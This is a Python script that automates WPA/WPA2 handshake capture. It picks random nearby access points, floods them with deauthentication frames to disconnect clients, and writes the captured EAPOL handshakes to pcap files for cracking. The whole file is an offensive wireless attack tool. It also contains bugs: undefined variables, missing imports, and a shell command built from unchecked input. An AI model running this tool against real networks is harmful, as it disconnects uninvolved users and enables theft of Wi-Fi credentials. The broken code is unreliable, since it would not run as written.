#!/bin/python3
#
# {
#   "description" : "automated WPA/WPA2 handshake capture",
#   "options" : [
#     {
#       "name" : "wifi.bssid",
#       "description" : "bssid of AP",
#       "flag" : "b",
#       "required" : "false"
#     },
#     {
#       "name" : "net.interface.channel",
#       "description" : "channel for AP (hops if none specified)",
#       "flag" : "c",
#       "required" : "false"
#     },
#     {
#       "name" : "wifi.deauth",
#       "description" : "deauthentication packets count",
#       "flag" : "d",
#       "required" : "false",
#       "default" : 3
#     },
#     {
#       "name" : "net.interface",
#       "description" : "network interface identifier",
#       "flag" : "i",
#       "required" : "true"
#     }
#   ]
# }

import argparse
import os
import random
from scapy.all import *
import subprocess
import sys
import time

# set constants
TO_DS = 0b01
FROM_DS = 0b10

# send deauthentication packets
def send_deauthentication(interface, bssid, count):
    time.sleep(2)
    print("sending '" + str(count)
        + "' deauthentication packets to '" + bssid + "'")

    packet = scapy.all.RadioTap()/scapy.all.Dot11(addr2=bssid,addr3=bssid)/scapy.all.Dot11Deauth()
    for i in range(count):
        scapy.all.sendp(packet, iface=interface, count=1, verbose=0)
        time.sleep(0.5)

# set channel of the specified interface
def set_nic_channel(interface, channel):
    print("setting interface '" + interface
        + "' to channel '" + str(channel) + "'")

    process = subprocess.Popen(
        ["iw dev " + interface + " set channel " + str(channel)],
        shell=True, stderr=subprocess.PIPE)

    _, error = process.communicate()
    if error:
        print("failed to set interface '" + interface + "' to channel '"
            + str(channel) + "' : '" + error.decode("utf-8") + "'")
        sys.exit(1)

# populate 'bssids' by sniffing 802.11 beacon packets
global bssids
def sniff_beacon(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet.getlayer(Dot11).addr2

        # if not already seen -> add address to bssids 
        if bssid not in bssids:
            bssids.append(bssid)
        # TODO - set bssid 'power'
        # TODO - check encryption type == 'WPA'

# sniff EAPOL packets to capture WPA handshake
global handshakes
def sniff_wpa_handshake(packet):
    # check if pkt performs authentication
    if EAPOL not in packet:
        return False

    # determine client address
    if packet.FCfield & TO_DS == TO_DS:
        client_address = p.addr2
    elif packet.FCfield & FROM_DS == FROM_DS:
        client_address = p.addr1
    else:
        return False # unreachable?

    print("processing EAPOL packet for client '" + client_address + "'")

    # check if client exists
    if client_address not in handshakes:
        # [to_ds_count, from_ds_count, packets]
        handshakes[client_address] = [0, 0, []]

    # process packet
    packets = handshakes[client_address]
    packets[2].append(packet)
    if packet.FCfield & TO_DS == TO_DS:
        packets[0] += 1
    elif packet.FCfield & FROM_DS == FROM_DS:
        packets[1] += 1
    else:
        return False # unreachable?

    # check for success
    if packet_counts[0] >= 2 and packet_counts[1] >= 2:
        return True

if __name__ == "__main__":
    # parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-b", "--bssid", required=False,
        help="bssid of wifi AP")
    parser.add_argument("-c", "--channel", required=False,
        help="network interface channel")
    parser.add_argument("-d", "--deauth", required=False,
        help="deauthentication packet count", default=3, type=int)
    parser.add_argument("-i", "--interface", required=True,
        help="network interface identifier")
    args = parser.parse_args()

    # initialize instance variables
    bssid = args.bssid

    # initialize global variables
    bssids = []
    handshakes = {}

    # if channel option is set -> set nic channel
    if args.channel != None:
        set_nic_channel(args.interface, args.channel)

    # loop indefinitely
    while True:
        # if channel option not set -> set interface to random channel
        if args.channel == None:
            set_nic_channel(args.interface, random.randrange(1, 14))

        # if bssid option not set -> choose random bssid to target
        if args.bssid == None:
            # sniff for available bssids
            del bssids[:]
            sniff(iface=args.interface, prn=sniff_beacon,
                store=False, timeout=3)

            # TODO - remove --exclude bssids

            # if no bssids found -> try again
            if len(bssids) == 0:
                continue

            # choose a random bssid
            bssid = bssids[random.randrange(0, len(bssids))]

        # open separate thread for deauthentication
        deauthentication_thread = threading.Thread(
            target=send_deauthentication,
            args=[args.interface, bssid, args.deauth])
        deauthentication_thread.start()

        # sniff on bssid
        print("sniffing bssid '" + bssid + "'")
        handshakes.clear()
        sniff(iface=args.interface, filter="ether host " + bssid,
            stop_filter=sniff_wpa_handshake, store=False, timeout=10)

        # check if valid handshake found
        for client_address, packets in handshakes.items():
            if packets[0] >= 2 and packets[1] >= 2:
                print("captured handshake from client '"
                    + client_address + "'")

                # write wpa handshake packets to file
                scapy.wrpcap(bssid + ".pcap", packets[2])
